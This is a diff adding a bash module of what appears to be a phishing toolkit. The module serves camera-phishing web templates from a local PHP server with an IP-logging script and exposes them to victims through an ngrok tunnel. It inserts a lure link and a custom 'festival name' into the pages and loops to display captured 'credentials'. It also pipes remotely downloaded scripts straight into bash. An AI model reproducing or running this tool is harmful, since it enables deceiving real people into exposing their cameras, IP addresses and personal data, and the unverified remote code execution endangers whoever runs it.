@@ -1,0 +1,161 @@
+#!/bin/bash
+
+# <<<--- Argument Mode ! --->>>
+
+if [[ ${1} == "-m" || ${1} == "--module" ]];then
+ if [[ ${2} == "4" || ${2} == "04" ]];then
+  if [[ ${3} == "-s" || ${3} == "--site" ]];then
+   if [[ ${4} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
+    then
+       if [[ ${4} -lt 5 ]]
+       then interrupt
+       MODE=withPHISH/CAMWEB
+       SITENUM="${CSITES[${4} -1]}"
+       echo -e "${b0SIGN} Webpage : ${SITENUM}"
+       if [[ ! $__return__ == 105 ]];then
+       cd ${CWD}/server
+       SCRIPT_PATH=$(pwd)
+       cd - &> /dev/null
+       bash ${CWD}/assets/programs/ngrok.installer
+       source ${CWD}/assets/programs/ngrok.configure
+       cp -rf  "${CWD}"/websites/withPHISH/CAMWEB/"${CSITES[${4} -1]}" "${CWD}/server"
+       cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${CSITES[${4} -1]}"
+       cd "${SCRIPT_PATH[@]}"/"${CSITES[${4} -1]}"
+       php -S localhost:8080 > /dev/null 2>&1 &
+       echo -e "\n${b0SIGN} Credentials details visible here !\n"
+       credentialLoop
+       else
+       cd $TMPDIR
+       if [ ! -d "$TMPDIR/server" ]
+       then
+       mkdir -p ${TMPDIR}/server
+       fi
+       cd server
+       if [[ ! -d "${GSITES[${4} -1]}" ]]
+       then
+       printf "${b0SIGN} Downloading webpage Template...\r"
+       svn checkout ${GITLINK}/trunk/websites/withPHISH/CAMWEB/"${CSITES[${4} -1]}" &> /dev/null
+       fi
+       cd ..
+       cd ${TMPDIR}/server/"${CSITES[${4} -1]}"
+       printf "${b0SIGN} Downloading Programs for Starting Server...\r"
+       curl -sLO ${RAWLINK}/server/ip.php
+       cd - &> /dev/null
+       bash <(curl -sL "${RAWLINK}/assets/programs/ngrok.installer")
+       source <(curl -sLo- "${RAWLINK}/assets/programs/ngrok.configure")
+       cd ${TMPDIR}/server/"${CSITES[${4} -1]}"
+       php -S localhost:8080 > /dev/null 2>&1 &
+       echo -e "\n${b0SIGN} Credentials details visible here !\n"
+       credentialLoop
+      fi
+   fi
+  else
+  echo "(>) Choose Site as given Number !"
+  exit 1
+   fi
+exit 0
+  fi
+ fi
+fi
+
+
+# <<<--- Input Mode ! --->>>
+
+function setupRecourses () {
+MODE=withPHISH/CAMWEB
+if [[ ! $__return__ == 105 ]];then
+   cd ${CWD}/server || exit 1
+   SCRIPT_PATH=$(pwd)
+   cd - &> /dev/null || exit 1
+   bash ${CWD}/assets/programs/ngrok.installer
+   source ${CWD}/assets/programs/ngrok.configure
+else
+   cd $TMPDIR || exit 1
+   if [ ! -d "$TMPDIR/server" ]
+   then
+   mkdir -p ${TMPDIR}/server
+   fi
+   cd server || exit 1
+   if [[ ! -d "${CSITES[${input} -1]}" ]]
+   then
+   printf "${b0SIGN} Downloading webpage Template...\r"
+   svn checkout ${GITLINK}/trunk/websites/withPHISH/CAMWEB/"${CSITES[${input} -1]}" &> /dev/null
+   fi
+   cd ..
+   cd ${TMPDIR}/server/"${CSITES[${input} -1]}" || exit 1
+   printf "${b0SIGN} Downloading Programs for Starting Server...\r"
+   curl -sLO ${RAWLINK}/server/ip.php
+   cd - &> /dev/null || exit 1
+   bash <(curl -sL "${RAWLINK}/assets/programs/ngrok.installer")
+   source <(curl -sLo- "${RAWLINK}/assets/programs/ngrok.configure")
+fi
+}
+
+function setupServer () {
+if [ ${#link} == 0 ]
+then
+exit 1
+fi
+sleep 0.5
+
+if [[ ! $__return__ == 105 ]];then
+cp -rf  "${CWD}"/websites/withPHISH/CAMWEB/"${CSITES[${input} -1]}" "${CWD}/server"
+cp "${SCRIPT_PATH[@]}"/ip.php "${SCRIPT_PATH[@]}"/"${CSITES[${input} -1]}"
+cd "${SCRIPT_PATH[@]}"/"${CSITES[${input} -1]}" || exit 1
+else
+cd ${TMPDIR}/server/"${CSITES[${input} -1]}" || exit 1
+fi
+}
+
+function startServer () {
+php -S localhost:8080 > /dev/null 2>&1 &
+echo -e "\n${b0SIGN} Credentials details visible here !\n"
+}
+
+# <<<--- Input Mode ! --->>>
+
+programA() {
+setupRecourses
+setupServer
+}
+
+programB() {
+startServer
+CcredentialLoop
+}
+
+if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
+then
+  if [[ ${input} == 1 ]]
+   then
+      programA
+      sed -i "s,forwarding-link,${link},g" index.html
+      sed -i "s,forwarding-link,${link},g" index.php
+      printf "\n${b0SIGN} Enter Festival Name : "
+      read -r nameFV
+      sed -i "s,fes_name,${nameFV},g" index.html
+      programB
+
+  elif [[ ${input} == 2 ]]
+   then
+      programA
+      sed -i "s,forwarding-link,${link},g" index.html
+      sed -i "s,forwarding-link,${link},g" index.php
+      programB
+
+  elif [[ ${input} == 3 ]]
+   then
+      programA
+      sed -i "s,forwarding-link,${link},g" index.html
+      sed -i "s,forwarding-link,${link},g" index.php
+      programB
+
+  elif [[ ${input} == 4 ]]
+   then
+      programA
+      sed -i "s,forwarding-link,${link},g" index.html
+      sed -i "s,forwarding-link,${link},g" index.php
+      programB
+  fi
+fi
+
